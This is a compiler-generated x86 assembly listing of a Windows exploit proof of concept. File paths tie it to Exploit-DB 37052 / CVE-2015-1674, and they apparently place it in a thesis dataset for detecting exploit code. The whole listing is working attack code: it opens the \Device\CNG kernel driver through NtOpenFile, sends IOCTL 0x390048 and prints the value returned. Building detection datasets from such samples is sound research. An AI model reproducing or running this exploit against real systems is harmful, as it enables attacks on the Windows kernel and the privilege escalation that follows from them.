; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_37052_cve_id_CVE-2015-1674.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	_main
EXTRN	__imp__CloseHandle@4:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	__imp__DeviceIoControl@32:PROC
EXTRN	__imp__GetProcAddress@8:PROC
EXTRN	__imp__LoadLibraryA@4:PROC
EXTRN	_exit:PROC
EXTRN	_RtlInitUnicodeString@8:PROC
EXTRN	___acrt_iob_func:PROC
EXTRN	_getchar:PROC
EXTRN	___stdio_common_vfprintf:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG98708 DB	'ntdll.dll', 00H
	ORG $+2
$SG98709 DB	'NtOpenFile', 00H
	ORG $+1
$SG98711 DB	'\', 00H, 'D', 00H, 'e', 00H, 'v', 00H, 'i', 00H, 'c', 00H
	DB	'e', 00H, '\', 00H, 'C', 00H, 'N', 00H, 'G', 00H, 00H, 00H
$SG98714 DB	'File successfully opened.', 0aH, 00H
	ORG $+1
$SG98715 DB	'File could not be opened.', 0aH, 00H
	ORG $+1
$SG98718 DB	'[*]Send IOCTL fail!', 0aH, 00H
	ORG $+3
$SG98719 DB	'[*]Error Code:%d', 0aH, 00H
	ORG $+2
$SG98720 DB	'[*]0x%08x', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_obja$ = -68						; size = 24
_iostatusblock$ = -44					; size = 8
_filename$ = -36					; size = 8
_bRet$ = -28						; size = 4
_dwCnt$ = -24						; size = 4
_stat$ = -20						; size = 4
_hModule$ = -16						; size = 4
_NtOpenFileStruct$ = -12				; size = 4
_hCNG$ = -8						; size = 4
_dwBuffer$ = -4						; size = 4
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_37052_cve_id_CVE-2015-1674.c
; Line 12
	push	ebp
	mov	ebp, esp
	sub	esp, 68					; 00000044H
; Line 17
	push	OFFSET $SG98708
	call	DWORD PTR __imp__LoadLibraryA@4
	mov	DWORD PTR _hModule$[ebp], eax
; Line 18
	push	OFFSET $SG98709
	mov	eax, DWORD PTR _hModule$[ebp]
	push	eax
	call	DWORD PTR __imp__GetProcAddress@8
	mov	DWORD PTR _NtOpenFileStruct$[ebp], eax
; Line 19
	cmp	DWORD PTR _NtOpenFileStruct$[ebp], 0
	jne	SHORT $LN2@main
; Line 20
	push	-1
	call	_exit
$LN2@main:
; Line 26
	push	OFFSET $SG98711
	lea	ecx, DWORD PTR _filename$[ebp]
	push	ecx
	call	_RtlInitUnicodeString@8
; Line 30
	mov	DWORD PTR _obja$[ebp+12], 64		; 00000040H
; Line 31
	lea	edx, DWORD PTR _filename$[ebp]
	mov	DWORD PTR _obja$[ebp+8], edx
; Line 32
	mov	DWORD PTR _obja$[ebp], 24		; 00000018H
; Line 33
	mov	DWORD PTR _obja$[ebp+4], 0
; Line 34
	mov	DWORD PTR _obja$[ebp+16], 0
; Line 35
	mov	DWORD PTR _obja$[ebp+20], 0
; Line 38
	mov	DWORD PTR _hCNG$[ebp], 0
; Line 39
	push	32					; 00000020H
	push	7
	lea	eax, DWORD PTR _iostatusblock$[ebp]
	push	eax
	lea	ecx, DWORD PTR _obja$[ebp]
	push	ecx
	push	1048577					; 00100001H
	lea	edx, DWORD PTR _hCNG$[ebp]
	push	edx
	call	DWORD PTR _NtOpenFileStruct$[ebp]
	mov	DWORD PTR _stat$[ebp], eax
; Line 40
	cmp	DWORD PTR _stat$[ebp], 0
	jl	SHORT $LN3@main
; Line 41
	push	OFFSET $SG98714
	call	_printf
	add	esp, 4
; Line 42
	jmp	SHORT $LN4@main
$LN3@main:
; Line 44
	push	OFFSET $SG98715
	call	_printf
	add	esp, 4
; Line 45
	or	eax, -1
	jmp	SHORT $LN7@main
$LN4@main:
; Line 47
	mov	DWORD PTR _dwBuffer$[ebp], 0
; Line 48
	mov	DWORD PTR _dwCnt$[ebp], 0
; Line 49
	push	0
	lea	eax, DWORD PTR _dwCnt$[ebp]
	push	eax
	push	4
	lea	ecx, DWORD PTR _dwBuffer$[ebp]
	push	ecx
	push	4
	lea	edx, DWORD PTR _dwBuffer$[ebp]
	push	edx
	push	3735624					; 00390048H
	mov	eax, DWORD PTR _hCNG$[ebp]
	push	eax
	call	DWORD PTR __imp__DeviceIoControl@32
	mov	DWORD PTR _bRet$[ebp], eax
; Line 50
	cmp	DWORD PTR _bRet$[ebp], 0
	jne	SHORT $LN5@main
; Line 52
	push	OFFSET $SG98718
	call	_printf
	add	esp, 4
; Line 53
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98719
	call	_printf
	add	esp, 8
; Line 54
	jmp	SHORT $LN6@main
$LN5@main:
; Line 57
	mov	ecx, DWORD PTR _dwBuffer$[ebp]
	push	ecx
	push	OFFSET $SG98720
	call	_printf
	add	esp, 8
$LN6@main:
; Line 59
	mov	edx, DWORD PTR _hCNG$[ebp]
	push	edx
	call	DWORD PTR __imp__CloseHandle@4
; Line 60
	call	_getchar
; Line 61
	xor	eax, eax
$LN7@main:
; Line 62
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
